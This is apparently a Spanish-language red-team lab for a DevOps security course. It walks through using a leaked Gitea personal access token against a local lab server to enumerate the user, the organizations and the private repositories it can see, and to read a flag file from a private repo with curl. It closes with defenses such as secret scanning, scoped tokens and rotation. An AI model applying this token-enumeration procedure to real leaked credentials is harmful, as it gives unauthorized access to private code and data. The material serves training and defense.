# 02 - Enumeracion con un PAT filtrado

**Clase 2 · 30 min · M3 Demo 01**
**Fase:** acceso inicial + descubrimiento
**MITRE ATT&CK:** T1552.001 (Credentials In Files), T1213 (Data from Information Repositories)
**Riesgo OWASP CI/CD:** CICD-SEC-2 (identidad y acceso), CICD-SEC-6 (higiene de credenciales)

## Escenario

Estas auditando el repo publico de la empresa y encuentras un archivo que no
deberia estar ahi: `secrets/dev_token.txt`. Contiene un token personal de Gitea
(PAT) del desarrollador `dev`. En un engagement real ese token llega por un repo
publico, un gist, un log de CI o el historial de Git.

Tu objetivo no es "usar el token", es responder: **a que tiene acceso esta
identidad?** Un PAT es una llave; la enumeracion es mirar todas las puertas que
abre.

## Objetivo de aprendizaje

- Enumerar una organizacion con la API de Gitea usando un PAT.
- Entender que `/user/repos` devuelve tambien repos privados.
- Extraer un archivo con la Contents API (base64).

## Antes de empezar

```bash
cd devops-redteam
export G=http://localhost:3000
export PAT=$(grep GITEA_TOKEN seed/repo/secrets/dev_token.txt | cut -d= -f2)
echo "${PAT:0:8}..."   # solo el prefijo, no imprimas el token entero en un informe
```

**Opcional:** confirma que el token esta en el repo publico, no en un sitio
privado:

```bash
curl -s $G/api/v1/repos/devops-org/devops-demo/contents/secrets/dev_token.txt \
  | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)["content"]).decode())'
```

## Paso 1 - Identificar la identidad

```bash
curl -s -H "Authorization: token $PAT" $G/api/v1/user | python3 -m json.tool
```

**Que esperar:** `login: "dev"`, `email: "dev@lab.local"`, `is_admin: false`.

**Por que importa:** antes de pivotar hay que saber quien eres. Un token de un
admin vale mucho mas que uno de un lector.

## Paso 2 - Enumerar organizaciones

```bash
curl -s -H "Authorization: token $PAT" $G/api/v1/user/orgs \
  | python3 -c 'import sys,json;[print(o["username"]) for o in json.load(sys.stdin)]'
```

**Que esperar:** `devops-org`.

## Paso 3 - Listar todo lo que ve el token

```bash
curl -s -H "Authorization: token $PAT" "$G/api/v1/user/repos?limit=50" \
  | python3 -c 'import sys,json;[print(r["full_name"], "private" if r["private"] else "public") for r in json.load(sys.stdin)]'
```

**Que esperar:**

```
devops-org/devops-demo public
devops-org/internal-docs private
```

El endpoint devuelve **privados incluidos** porque el token es del usuario, no
una busqueda publica. Ese es el salto de informacion: un archivo en un repo
publico da acceso a un repo privado de la organizacion.

## Paso 4 - Leer el repo privado

```bash
curl -s -H "Authorization: token $PAT" \
  "$G/api/v1/repos/devops-org/internal-docs/contents/flag.txt" \
  | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)["content"]).decode())'
```

**Que esperar:** `FLAG{gitea_enum_private_repo}`

La Contents API devuelve el contenido en base64. Es el mismo endpoint que usa la
web; no hay nada especial, solo permisos.

## Paso 5 - Guardar el inventario como evidencia

```bash
mkdir -p ~/do-rta-evidence/lab02
curl -s -H "Authorization: token $PAT" "$G/api/v1/user/repos?limit=50" \
  -o ~/do-rta-evidence/lab02/repos.json
python3 - <<'PY' > ~/do-rta-evidence/lab02/acceso.txt
import json, os
for r in json.load(open(os.path.expanduser('~/do-rta-evidence/lab02/repos.json'))):
    print(r['full_name'], 'privado' if r['private'] else 'publico', r['permissions'])
PY
cat ~/do-rta-evidence/lab02/acceso.txt
```

**Que demuestra:** el informe debe decir "el PAT de `dev` daba acceso de lectura
al repo privado X", no solo "encontre un token".

## Variante con CLI

Si tienes `tea` instalado: `tea login add --url $G --token $PAT`,
`tea repos list --owner devops-org`. La API es la misma; cambia la comodidad.

## Evidencia para el informe

- Identidad del token (`login`, `email`) y fecha de la prueba.
- Lista de repos con marca publico/privado.
- Archivo concreto leido del repo privado y su ruta.
- **No** copies el token completo en el informe; referencia el archivo y la linea.

## Checkpoint

1. Por que `/user/repos` es mas peligroso que `/repos/search` para un atacante?
2. Que scope minimo deberia tener un token de CI que solo lee un repo?
3. Si el token se filtra, basta con borrar el archivo del repo?

## Defensa

- Nunca commitear tokens. `gitleaks` en pre-commit y en CI (lab 17).
- PAT con scope y caducidad, no `all`; un token por caso de uso.
- **Rotar** al detectar la exposicion: borrar el archivo no invalida la llave.
- Alertar de accesos a repos privados desde IPs o tokens que no los usan nunca.
- Separar la organizacion de repos publicos de la de repos internos.
